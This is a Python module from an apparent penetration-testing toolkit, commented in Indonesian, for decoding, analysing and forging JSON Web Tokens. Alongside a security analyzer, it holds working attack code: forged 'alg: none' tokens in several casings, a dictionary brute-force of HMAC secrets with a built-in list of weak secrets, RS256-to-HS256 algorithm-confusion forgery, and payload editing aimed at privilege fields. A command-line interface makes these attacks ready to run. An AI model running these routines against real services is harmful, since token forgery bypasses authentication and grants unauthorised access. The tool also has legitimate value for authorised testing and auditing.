"""
AnarkisHunter — utils_jwt.py
===============================
JWT decoder, editor, re-encoder, dan vulnerability checker.
Deteksi: none algorithm, weak secret, alg confusion (RS256→HS256).

Usage standalone:
    python modules/utils/utils_jwt.py --decode <token>
    python modules/utils/utils_jwt.py --crack <token> --wordlist passwords.txt
    python modules/utils/utils_jwt.py --none-attack <token>
"""

import sys
import json
import hmac
import hashlib
import base64
from typing import Optional, Dict, List, Tuple
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))


def _b64_decode_padding(data: str) -> bytes:
    """Decode base64 dengan auto-padding."""
    data = data.replace("-", "+").replace("_", "/")
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.b64decode(data)


def _b64_encode_url(data: bytes) -> str:
    """Encode ke base64 URL-safe tanpa padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt(token: str) -> Dict:
    """
    Decode JWT tanpa verifikasi signature.
    
    Returns:
        Dict berisi header, payload, signature, dan raw parts
    """
    token = token.strip()
    parts = token.split(".")
    
    if len(parts) != 3:
        return {"error": "Invalid JWT format (expected 3 parts)"}
    
    try:
        header = json.loads(_b64_decode_padding(parts[0]))
        payload = json.loads(_b64_decode_padding(parts[1]))
        
        return {
            "header": header,
            "payload": payload,
            "signature": parts[2],
            "raw_parts": parts,
            "algorithm": header.get("alg", "unknown"),
        }
    except Exception as e:
        return {"error": f"Failed to decode JWT: {e}"}


def encode_jwt(header: Dict, payload: Dict, secret: str = "", algorithm: str = "HS256") -> str:
    """
    Encode JWT dengan header dan payload yang diberikan.
    
    Args:
        header: JWT header dict
        payload: JWT payload dict
        secret: Secret key untuk signing
        algorithm: Algorithm (HS256, HS384, HS512, none)
    """
    header["alg"] = algorithm

    header_b64 = _b64_encode_url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64_encode_url(json.dumps(payload, separators=(",", ":")).encode())
    
    message = f"{header_b64}.{payload_b64}"

    if algorithm.lower() == "none":
        return f"{message}."
    elif algorithm.startswith("HS"):
        bit_size = int(algorithm[2:])
        hash_algo = {256: hashlib.sha256, 384: hashlib.sha384, 512: hashlib.sha512}.get(bit_size, hashlib.sha256)
        sig = hmac.new(secret.encode(), message.encode(), hash_algo).digest()
        return f"{message}.{_b64_encode_url(sig)}"
    else:
        return f"{message}."


def none_algorithm_attack(token: str) -> List[Dict]:
    """
    JWT None Algorithm Attack.
    Buat versi token dengan alg:none untuk bypass signature verification.
    
    Returns:
        List of crafted tokens dengan berbagai variasi "none"
    """
    decoded = decode_jwt(token)
    if "error" in decoded:
        return []
    
    payload = decoded["payload"]
    results = []
    
    # Variasi penulisan "none"
    none_variants = ["none", "None", "NONE", "nOnE", "NoNe"]
    
    for variant in none_variants:
        header = {"alg": variant, "typ": "JWT"}
        header_b64 = _b64_encode_url(json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = _b64_encode_url(json.dumps(payload, separators=(",", ":")).encode())
        
        # Tanpa signature
        crafted_no_sig = f"{header_b64}.{payload_b64}."
        # Dengan signature original
        crafted_with_sig = f"{header_b64}.{payload_b64}.{decoded['signature']}"
        
        results.append({
            "variant": variant,
            "token_no_sig": crafted_no_sig,
            "token_with_sig": crafted_with_sig,
        })
    
    return results


def crack_jwt_secret(
    token: str,
    wordlist: Optional[List[str]] = None,
    wordlist_file: Optional[str] = None,
) -> Optional[str]:
    """
    Brute force JWT secret dengan dictionary attack.
    Hanya untuk algoritma HS256, HS384, HS512.
    
    Returns:
        Secret jika ditemukan, None jika tidak
    """
    decoded = decode_jwt(token)
    if "error" in decoded:
        return None
    
    algorithm = decoded.get("algorithm", "").upper()
    if not algorithm.startswith("HS"):
        return None
    
    bit_size = int(algorithm[2:])
    hash_algo = {256: hashlib.sha256, 384: hashlib.sha384, 512: hashlib.sha512}.get(bit_size, hashlib.sha256)
    
    parts = token.split(".")
    message = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = _b64_decode_padding(parts[2])
    
    words = list(wordlist or [])
    if wordlist_file and Path(wordlist_file).exists():
        try:
            lines = Path(wordlist_file).read_text(encoding="utf-8", errors="replace").splitlines()
            words.extend(l.strip() for l in lines if l.strip())
        except Exception:
            pass
    
    # Default wordlist
    if not words:
        words = [
            "secret", "password", "123456", "admin", "test", "key",
            "jwt_secret", "jwt-secret", "mysecret", "supersecret",
            "your-256-bit-secret", "your-secret", "changeme", "defaultsecret"
        ]
    
    for secret in words:
        try:
            sig = hmac.new(secret.encode(), message, hash_algo).digest()
            if hmac.compare_digest(sig, expected_sig):
                return secret
        except Exception:
            continue
    
    return None


def rs256_to_hs256_attack(token: str, public_key: str) -> str:
    """
    Algorithm Confusion Attack: RS256 → HS256.
    Gunakan RSA public key sebagai HMAC secret.
    
    Args:
        token: JWT original
        public_key: RSA public key dalam PEM format
        
    Returns:
        Crafted JWT menggunakan public key sebagai HMAC secret
    """
    decoded = decode_jwt(token)
    if "error" in decoded:
        return ""
    
    header = decoded["header"].copy()
    header["alg"] = "HS256"
    payload = decoded["payload"]
    
    header_b64 = _b64_encode_url(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64_encode_url(json.dumps(payload, separators=(",", ":")).encode())
    message = f"{header_b64}.{payload_b64}".encode()
    
    sig = hmac.new(public_key.encode(), message, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{_b64_encode_url(sig)}"


def modify_jwt_payload(token: str, modifications: Dict, secret: str = "", algorithm: str = "HS256") -> str:
    """
    Modifikasi payload JWT dan re-encode.
    
    Args:
        token: JWT original
        modifications: Dict berisi field yang akan diubah
        secret: Secret untuk signing (kosong untuk unsigned)
        algorithm: Algorithm signing
        
    Returns:
        JWT baru dengan payload yang dimodifikasi
    """
    decoded = decode_jwt(token)
    if "error" in decoded:
        return ""
    
    header = decoded["header"].copy()
    payload = decoded["payload"].copy()
    payload.update(modifications)
    
    return encode_jwt(header, payload, secret, algorithm)


def analyze_jwt_security(token: str) -> List[Dict]:
    """
    Analisis keamanan JWT dan identifikasi kerentanan.
    
    Returns:
        List of vulnerability findings
    """
    findings = []
    decoded = decode_jwt(token)
    
    if "error" in decoded:
        return [{"error": decoded["error"]}]
    
    header = decoded["header"]
    payload = decoded["payload"]
    algorithm = decoded.get("algorithm", "").upper()
    
    # Cek algorithm none
    if algorithm.lower() in ["none", "null", ""]:
        findings.append({
            "type": "none_algorithm",
            "severity": "CRITICAL",
            "description": "JWT menggunakan algorithm 'none' — tidak ada signature verification!",
            "owasp": "A07",
            "recommendation": "Tolak semua JWT dengan algorithm 'none'",
        })
    
    # Cek weak algorithm
    if algorithm in ["HS256", "HS384", "HS512"]:
        findings.append({
            "type": "symmetric_algorithm",
            "severity": "INFO",
            "description": f"JWT menggunakan {algorithm} (symmetric). Rentan terhadap brute force jika secret lemah.",
            "owasp": "A02",
            "recommendation": "Gunakan RS256 atau ES256 (asymmetric) untuk production",
        })
    
    # Cek expiry
    import time
    exp = payload.get("exp")
    if not exp:
        findings.append({
            "type": "no_expiry",
            "severity": "MEDIUM",
            "description": "JWT tidak memiliki expiry (exp claim). Token berlaku selamanya!",
            "owasp": "A07",
            "recommendation": "Selalu set exp claim dengan waktu yang masuk akal (1h, 24h, dll)",
        })
    elif exp < time.time():
        findings.append({
            "type": "expired_token",
            "severity": "INFO",
            "description": "JWT sudah expired",
            "owasp": "A07",
        })
    
    # Cek kid header (key injection)
    kid = header.get("kid")
    if kid:
        if "/" in str(kid) or ".." in str(kid):
            findings.append({
                "type": "kid_path_traversal",
                "severity": "CRITICAL",
                "description": f"'kid' header mengandung path traversal: {kid}",
                "owasp": "A03",
                "recommendation": "Validasi dan sanitasi 'kid' header sebelum digunakan sebagai file path/key ID",
            })
        elif "' " in str(kid) or "'" in str(kid):
            findings.append({
                "type": "kid_sql_injection",
                "severity": "CRITICAL",
                "description": f"'kid' header mungkin rentan SQL injection: {kid}",
                "owasp": "A03",
            })
    
    # Cek sensitive data dalam payload
    sensitive_keys = ["password", "passwd", "secret", "credit_card", "ssn", "pin"]
    for key in payload:
        if any(s in key.lower() for s in sensitive_keys):
            findings.append({
                "type": "sensitive_data_in_payload",
                "severity": "HIGH",
                "description": f"JWT payload mengandung data sensitif: '{key}'",
                "owasp": "A02",
                "recommendation": "Jangan simpan data sensitif di JWT payload (tidak dienkripsi!)",
            })
    
    # Cek privilege escalation fields
    priv_fields = ["admin", "role", "is_admin", "is_superuser", "permissions", "scope", "group"]
    for key in payload:
        if any(p in key.lower() for p in priv_fields):
            findings.append({
                "type": "privilege_field",
                "severity": "MEDIUM",
                "description": f"JWT payload berisi field privilege: '{key}' = '{payload[key]}'",
                "owasp": "A01",
                "recommendation": "Cek apakah field ini bisa dimanipulasi untuk privilege escalation",
            })
    
    return findings


# ─── Standalone ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    from rich.console import Console
    from rich.table import Table
    from rich.syntax import Syntax
    from rich.panel import Panel

    console = Console()
    parser = argparse.ArgumentParser(description="JWT Analyzer")
    parser.add_argument("--decode", help="Decode JWT token")
    parser.add_argument("--analyze", help="Analyze JWT security")
    parser.add_argument("--crack", help="Crack JWT secret")
    parser.add_argument("--none-attack", help="Generate none-algorithm tokens", dest="none_attack")
    parser.add_argument("--wordlist", help="Wordlist for cracking")
    args = parser.parse_args()

    if args.decode or args.analyze:
        token = args.decode or args.analyze
        decoded = decode_jwt(token)

        if "error" in decoded:
            console.print(f"[red]Error: {decoded['error']}[/red]")
        else:
            console.print(Panel(
                Syntax(json.dumps(decoded["header"], indent=2), "json", theme="monokai"),
                title="[cyan]Header[/cyan]", border_style="cyan"
            ))
            console.print(Panel(
                Syntax(json.dumps(decoded["payload"], indent=2), "json", theme="monokai"),
                title="[green]Payload[/green]", border_style="green"
            ))

        if args.analyze:
            findings = analyze_jwt_security(token)
            if findings:
                table = Table(title="JWT Security Analysis", border_style="red")
                table.add_column("Severity", width=10)
                table.add_column("Issue", style="yellow")
                table.add_column("Description", style="white")
                for f in findings:
                    if "error" in f:
                        continue
                    color = {"CRITICAL": "bold red", "HIGH": "red", "MEDIUM": "yellow", "LOW": "cyan", "INFO": "blue"}.get(f.get("severity", ""), "white")
                    table.add_row(
                        f"[{color}]{f.get('severity', 'INFO')}[/{color}]",
                        f.get("type", ""),
                        f.get("description", "")[:100]
                    )
                console.print(table)

    elif args.crack:
        console.print(f"\n[cyan]Cracking JWT secret...[/cyan]")
        result = crack_jwt_secret(args.crack, wordlist_file=args.wordlist)
        if result:
            console.print(f"[bold green]✅ SECRET FOUND: {result}[/bold green]\n")
        else:
            console.print("[red]❌ Secret not found in wordlist[/red]\n")

    elif args.none_attack:
        tokens = none_algorithm_attack(args.none_attack)
        for t in tokens:
            console.print(f"\n[yellow]Variant: {t['variant']}[/yellow]")
            console.print(f"[cyan]No-sig:[/cyan] {t['token_no_sig']}")
